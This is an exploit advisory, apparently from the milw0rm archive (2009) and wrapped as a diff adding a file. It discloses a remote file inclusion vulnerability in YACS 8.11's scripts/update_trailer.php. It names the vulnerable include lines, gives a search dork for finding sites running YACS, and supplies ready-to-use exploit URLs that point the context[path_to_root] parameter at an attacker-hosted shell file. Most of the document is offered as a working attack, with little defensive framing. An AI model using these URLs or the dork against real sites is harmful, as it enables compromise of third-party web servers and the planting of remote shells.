@@ -1,0 +1,41 @@
+              -----------------[remote file include]-----------------
+
+script: YACS version 8.11
+   
+------------------------------------------------------------------
+
+download from: http://www.yetanothercommunitysystem.com/file-fetch/814-20081130-yacs-8.11rc30.zip
+   
+
+==============================================
+vul: /yacs/scripts/update_trailer.php line 21 23 25;
+
+
+include_once $context['path_to_root'].'shared/safe.php'; 21
+if(!class_exists('i18n'))
+ include_once $context['path_to_root'].'i18n/i18n.php'; 23
+if(!class_exists('SQL'))
+include_once $context['path_to_root'].'shared/sql.php'; 25
+
+
+
+==============================================
+
+dork: "Powered by yacs"
+----------------------------------------------
+
+xpl:
+
+http://127.0.0.1/path/yacs/scripts/update_trailer.php?context[path_to_root]=[shell.txt?]
+
+http://127.0.0.1/yacs/scripts/update_trailer.php?context[path_to_root]=[shell.txt?]
+
+***************************************************
+***************************************************
+---------------------------------------------------
+Author: ahmadbady  [kivi_hacker666@yahoo.com]
+
+from[iran]
+---------------------------------------------------
+
+# milw0rm.com [2009-02-16]
